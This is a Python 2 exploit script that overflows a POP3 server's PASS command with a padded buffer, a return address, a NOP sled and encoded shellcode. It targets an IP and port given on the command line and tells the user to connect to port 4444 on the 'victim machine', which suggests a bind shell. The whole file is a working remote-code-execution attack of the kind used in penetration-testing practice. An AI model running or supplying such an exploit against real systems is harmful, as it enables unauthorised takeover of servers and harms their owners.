import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


shellcode = ("\xda\xd9\xbd\xd5\x18\x2b\x8f\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x58\x31\x6f\x1a\x03\x6f\x1a\x83\xc7\x04\xe2\x20\xa0\xbe\x76"
"\x47\x15\x1b\x57\x8e\xe2\xb8\x9c\x6b\x22\x08\xed\xd9\xb7\x61"
"\xf2\xec\xf4\x7b\x08\xd8\x0c\xec\x3f\xc0\x1d\x01\x85\xdc\x12"
"\x74\xc9\xed\x13\xeb\x0e\x3f\xe6\x2f\x6d\x29\x79\xf8\x17\xd7"
"\x71\x44\x79\x72\xc4\xbe\x0f\xf4\x09\xe6\xe6\x8f\xca\xd2\xc6"
"\xe4\xce\xd7\x04\x90\x17\xf0\xd5\x5a\xfa\x66\x46\x0c\x6d\x55"
"\x3b\x15\x79\x48\xf6\x2f\xc1\xb8\x6d\x22\x8c\xcc\xb8\x30\xeb"
"\x76\xba\xde\x74\xf6\x8a\xf3\xce\x85\xc4\xec\x4d\x0b\xb2\x34"
"\x7b\x79\x45\xb7\xf0\xef\xba\xbe\xe6\xe3\xd5\xfe\x7b\xcc\x48"
"\xda\xb5\x48\x69\xa2\x7c\x26\xa1\xe1\x44\x92\xd2\xee\x8d\x65"
"\xa8\xd0\xf8\xa7\x2a\xf6\x7c\xc9\x94\xd4\x59\x18\xe5\x6b\xdf"
"\x2f\x18\xe8\xb5\x27\xbe\x06\xce\xc5\x96\x65\x1e\x87\xcc\xc2"
"\xb1\x35\x9e\xec\x93\x87\x98\xda\xda\x0c\xe6\xc3\x92\x34\x5d"
"\xbe\xdc\xf0\x5b\x54\xa9\x9f\xf2\xda\x54\x3e\x86\xac\x2a\x75"
"\xa5\x2e\x07\xae\xda\x80\xdb\x3a\xa7\x18\xe7\x88\xc4\x07\x2e"
"\x6f\xc3\x95\x2a\x3b\x44\xc4\x18\x98\xe8\x2b\xde\x7d\xf7\xe8"
"\x33\xb0\xa5\x9a\x55\x3f\x42\xcc\x5e\xb8\x88\x1b\xda\xca\x0c"
"\xf7\x2e\xd8\x23\xf9\xec\xed\xc6\x59\x96\x1a\xe6\xa9\xb1\x83"
"\xb6\x21\x25\x3f\xae\x6e\x89\x4a\x4e\xa5\x15\x98\x4b\xee\xb8"
"\x49\x4f\x1f\x38\x80\x3a\x31\x32\xa5\xb2\x2d\x04\x7c\x56\xf9"
"\x91\x61\x15\x03\x7e\x3a\xbf\xff\xc4\x8d\x50\x97\x02\x95\x9e"
"\x89\x30\x3f\x19\x5b\x42\xb0\x3a\x52\x96\x17\x53\xde\xc0\xdf"
"\x8b\x5f\xee\xa8\xa6\xd4\xac\xa9\xbd\xb4\xe4\xe6\x3d\xfd\x1c"
"\x9e\x42\xc2\xf8\xee\xa2\x76\xe6\x24\x7b\x21\x71\xfe\xc6\xea"
"\x8c\x9b\x81")

ip_address = 0
port_num = 0
                                             


print (len(sys.argv) -1)

if (len(sys.argv) -1) != 2:
    print "The application only takes two argement [IPv4 address] & [Port No.]."
    sys.exit()

ip_address = sys.argv[1]
port_num = sys.argv[2]

print "Target Ip address" + ip_address
print "Target Port " + port_num

buffer = 2606*"A" + "\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode
try:
	print "\nSending evil buffer..."
	s.connect((ip_address ,port_num))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
        s.send('PASS ' + buffer + '\r\n')
	data = s.recv(1024)
	s.close()
	print "\nDone! Try connecting to port 4444 on victim machine."
except:
	print "Could not connect to POP3!"

